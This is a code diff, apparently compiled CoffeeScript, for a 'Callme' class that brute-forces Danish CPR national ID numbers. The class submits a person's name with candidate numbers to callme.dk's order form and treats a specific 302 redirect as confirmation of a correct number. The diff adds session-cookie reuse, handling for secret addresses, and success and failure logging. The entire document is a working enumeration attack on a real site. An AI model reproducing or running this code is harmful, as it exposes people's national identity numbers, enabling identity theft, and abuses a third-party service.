@@ -18,7 +18,7 @@
 
     Callme.name = 'Callme';
 
-    function Callme(inputData, socket) {
+    function Callme(inputData, socket, session_cookie) {
       console.log("Callme constructor");
       this.inputData = inputData;
       this.socket = socket;
@@ -48,10 +48,41 @@
           lastName: inputData["lastName"]
         }
       };
+      this.settings = {
+        urlencoding: 'iso'
+      };
+      if (session_cookie != null) {
+        this.req.data.cookie = session_cookie;
+      }
     }
 
     Callme.prototype.updateCPR = function() {
       return this.req.data.CPR2 = this.inputData["cprList"][this.counter];
+    };
+
+    Callme.prototype.getResponse = function(req, res, callback) {
+      var cpr, msg,
+        _this = this;
+      cpr = querystring.parse(req.data).CPR1 + querystring.parse(req.data).CPR2;
+      msg = $(res.body).find("#orderForm .error").text();
+      if (res.body.indexOf("din adresse er hemmelig") > 0) {
+        this.inputData.cprList = this.inputData.cprList.slice(this.counter + 1, this.inputData.cprList.length);
+        console.log("Restarting with: ");
+        console.log(this.inputData.cprList);
+        this.constructor(this.inputData, this.socket);
+        this.prepareRequest(function() {
+          callback(cpr, "error", msg);
+          return console.log("Secret: " + cpr);
+        });
+        return false;
+      }
+      if (res.status_code === "302" && res.location === "http://www.callme.dk/pow-basic/5") {
+        callback(cpr, "success", "");
+        return console.log("Succes: " + cpr);
+      } else {
+        callback(cpr, "error", msg);
+        return console.log("Incorrect CPR: " + cpr);
+      }
     };
 
     Callme.prototype.prepareRequest = function(startBruteForce) {
@@ -140,20 +171,10 @@
       });
     };
 
-    Callme.prototype.getResponse = function(req, res, callback) {
-      var cpr, status;
-      cpr = querystring.parse(req.data).CPR1 + querystring.parse(req.data).CPR2;
-      console.log(cpr);
-      if (res.statusCode === 302 && res.headers.location === "http://www.callme.dk/pow-basic/5") {
-        return callback(cpr, "success");
-      } else {
-        status = $(res.body).find("#orderForm .mobiltelefoner .block01 .inner03 .error").text();
-        return callback(cpr, status);
-      }
-    };
-
     return Callme;
 
   })(Recipe.Recipe);
+
+  module.exports = this.Callme;
 
 }).call(this);
